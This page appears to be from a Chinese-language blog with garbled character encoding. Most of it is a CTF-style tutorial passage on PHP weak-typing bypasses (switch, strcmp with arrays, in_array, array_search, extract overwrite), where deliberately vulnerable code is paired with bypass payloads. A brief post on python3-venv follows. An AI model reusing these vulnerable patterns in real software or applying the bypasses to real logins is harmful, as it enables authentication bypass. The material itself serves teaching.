<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?message=&#123;<span class="string">&quot;key&quot;</span>:<span class="number">0</span>&#125; <span class="comment">//&quot;adminasdasdasd&quot;å­—ç¬¦ä¸²å’Œæ•°å­—è¿›è¡Œæ¯”è¾ƒçš„æ—¶å€™ä¼šè½¬æ¢æˆæ•°å­—</span></span><br><span class="line"><span class="comment">//&quot;adminasdasdasd&quot;è½¬æ¢æˆæ•°å­—ä¸º0</span></span><br></pre></td></tr></table></figure>

<h3 id="æ¡ˆä¾‹4-switch"><a href="#æ¡ˆä¾‹4-switch" class="headerlink" title="æ¡ˆä¾‹4 switch"></a>æ¡ˆä¾‹4 switch</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>åœ¨æ¯”è¾ƒçš„æ—¶å€™ä¼šå°†å­—ç¬¦ä¸²è½¬æ¢æˆæ•°å­—ï¼Œè½¬æ¢æ–¹æ³•å‚è€ƒä¸Šé¢</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$i</span> =<span class="string">&quot;3name&quot;</span>;</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$i</span>)&#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">	<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">	<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;this is two&quot;</span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;flag&quot;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//echo flag switch caseæ•°å­—çš„æ—¶å€™å¼ºåˆ¶æŠŠ&quot;3name&quot;è½¬æ¢æˆæ•°å­—è¿›è¡Œæ¯”è¾ƒï¼Œå­—ç¬¦ä¸²å¼€å¤´åŒ…æ‹¬ä»€ä¹ˆæ•°å­—å°±ä¼šè½¬æ¢æˆä»€ä¹ˆæ•°å­—</span></span><br></pre></td></tr></table></figure>

<h3 id="æ¡ˆä¾‹5-strcmp"><a href="#æ¡ˆä¾‹5-strcmp" class="headerlink" title="æ¡ˆä¾‹5 strcmp"></a>æ¡ˆä¾‹5 strcmp</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">strcmp</span>(string1,string2)	strcmpå°†string1å’Œstring2è½¬æ¢ä¸ºasciiç ç›¸å‡ è‹¥è¿”å›<span class="number">0</span>,ä»£è¡¨ä¸¤ä¸ªå­—ç¬¦ä¸²ç›¸ç­‰ ï¼›è‹¥è¿”å›&lt;<span class="number">0</span> ,ä»£è¡¨string1 å°äº string2ï¼›è‹¥è¿”å›&gt;<span class="number">0</span>ï¼Œä»£è¡¨string1 å¤§äº string2</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strcmpåœ¨æ¯”è¾ƒå­—ç¬¦ä¸²å’Œæ•°ç»„çš„æ—¶å€™ä¼šè¿”å›<span class="number">0</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$password</span>=<span class="string">&quot;asdasdad&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strcmp</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>],<span class="variable">$password</span>)==<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Right!!!login success&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Wrong password..&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password[]=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<h3 id="æ¡ˆä¾‹6-in-array"><a href="#æ¡ˆä¾‹6-in-array" class="headerlink" title="æ¡ˆä¾‹6 in_array"></a>æ¡ˆä¾‹6 in_array</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$array</span> = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="string">&#x27;3&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">in_array</span>(<span class="string">&#x27;abc&#x27;</span>, <span class="variable">$array</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">in_array</span>(<span class="string">&#x27;1bc&#x27;</span>, <span class="variable">$array</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">in_array</span>(<span class="number">3</span>, <span class="variable">$array</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¿è¡Œç»“æœ<span class="keyword">bool</span>(<span class="literal">true</span>) <span class="keyword">bool</span>(<span class="literal">true</span>) <span class="keyword">bool</span>(<span class="literal">true</span>) </span><br></pre></td></tr></table></figure>

<h3 id="æ¡ˆä¾‹7-array-search"><a href="#æ¡ˆä¾‹7-array-search" class="headerlink" title="æ¡ˆä¾‹7 array_search"></a>æ¡ˆä¾‹7 array_search</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$array</span> = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="string">&#x27;3&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">array_search</span>(<span class="string">&#x27;abc&#x27;</span>, <span class="variable">$array</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">array_search</span>(<span class="string">&#x27;1bc&#x27;</span>, <span class="variable">$array</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">array_search</span>(<span class="number">3</span>, <span class="variable">$array</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">array_search</span>(<span class="string">&#x27;3&#x27;</span>, <span class="variable">$array</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>(<span class="number">0</span>) <span class="keyword">int</span>(<span class="number">1</span>) <span class="keyword">int</span>(<span class="number">3</span>) <span class="keyword">int</span>(<span class="number">3</span>)  </span><br></pre></td></tr></table></figure>

<h2 id="å˜é‡è¦†ç›–extract"><a href="#å˜é‡è¦†ç›–extract" class="headerlink" title="å˜é‡è¦†ç›–extract"></a>å˜é‡è¦†ç›–extract</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">extract</span>(); å°†è¾“å…¥å†…å®¹å¯¼å…¥ç¬¦å·è¡¨ï¼Œä¼šå­˜åœ¨å˜é‡è¦†ç›–</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$gift</span>))&#123;</span><br><span class="line">	<span class="variable">$content</span> = <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$flag</span>));</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$gift</span> == <span class="variable">$content</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;oh..&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?gift=&amp;content=</span><br></pre></td></tr></table></figure>
</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2023-09-18</span><span class="leancloud_visitors"></span><span>About 978 words, 3 min 15 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2023/09/18/python3-venv%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E4%BD%BF%E7%94%A8-%E8%A7%A3%E5%86%B3%E5%8C%85%E7%AE%A1%E7%90%86%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6%E6%B7%B7%E4%B9%B1%E7%9A%84%E9%97%AE%E9%A2%98/">python3-venvè™šæ‹Ÿç¯å¢ƒä½¿ç”¨-è§£å†³åŒ…ç®¡ç†ç‰ˆæœ¬æ§åˆ¶æ··ä¹±çš„é—®é¢˜</a></h3></div><div class="post-content"><div class="card"><p><h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install python3-venv</span><br></pre></td></tr></table></figure>

<h2 id="åˆ›å»ºè™šæ‹Ÿç¯å¢ƒ"><a href="#åˆ›å»ºè™šæ‹Ÿç¯å¢ƒ" class="headerlink" title="åˆ›å»ºè™šæ‹Ÿç¯å¢ƒ"></a>åˆ›å»ºè™šæ‹Ÿç¯å¢ƒ</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m venv test_env</span><br></pre></td></tr></table></figure>

<p>ä¼šè‡ªåŠ¨åœ¨ç”¨æˆ·ç›®å½•åˆ›å»ºä¸€ä¸ªtest _envçš„è™šæ‹Ÿç¯å¢ƒç›®å½•</p>
<h2 id="å¼€å¯-ä½¿ç”¨è™šæ‹Ÿç¯å¢ƒ"><a href="#å¼€å¯-ä½¿ç”¨è™šæ‹Ÿç¯å¢ƒ" class="headerlink" title="å¼€å¯&amp;ä½¿ç”¨è™šæ‹Ÿç¯å¢ƒ"></a>å¼€å¯&amp;ä½¿ç”¨è™šæ‹Ÿç¯å¢ƒ</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source ~/test_env/bin/activate</span><br></pre></td></tr></table></figure>

<p>å¼€å¯è™šæ‹Ÿç¯å¢ƒåpip installå®‰è£…çš„åŒ…ä¼šè‡ªåŠ¨å­˜æ”¾åœ¨&#x2F;test_env&#x2F;lib&#x2F;pythonx.x&#x2F;site-packagesç›®å½•ä¸‹é¢</p>
<h2 id="å…³é—­è™šæ‹Ÿç¯å¢ƒ"><a href="#å…³é—­è™šæ‹Ÿç¯å¢ƒ" class="headerlink" title="å…³é—­è™šæ‹Ÿç¯å¢ƒ"></a>å…³é—­è™šæ‹Ÿç¯å¢ƒ</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deactivate</span><br></pre></td></tr></table></figure>
</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2023-09-18</span><span class="leancloud_visitors"></span><span>About 98 words, 19 sec  read</span></div></div></div></div><div class="pagination"><ul class="clearfix"><li class="next pagbuttons"><a class="btn" role="navigation" href="/page/2/">Next</a></li></ul></div></div></div></div><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script><script src="/js/add-bookmark.js"></script><script>(function(window){var INSIGHT_CONFIG={TRANSLATION:{POSTS:"Posts",PAGES:"Pages",CATEGORIES:"Categories",TAGS:"Tags",UNTITLED:"(Untitled)",},CONTENT_URL:"/content.json",};window.INSIGHT_CONFIG=INSIGHT_CONFIG})(window);</script><script src="/js/insight.js" defer></script><div class="searchbox ins-search"><div class="searchbox-container ins-search-container"><div class="searchbox-input-wrapper"><input class="searchbox-input ins-search-input" type="text" placeholder="Search..."><span class="searchbox-close"><a class="fa fa-times-circle" onclick="closeWindow();"></a></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"><p>Seraching...</p></div></div></div></div></body></html>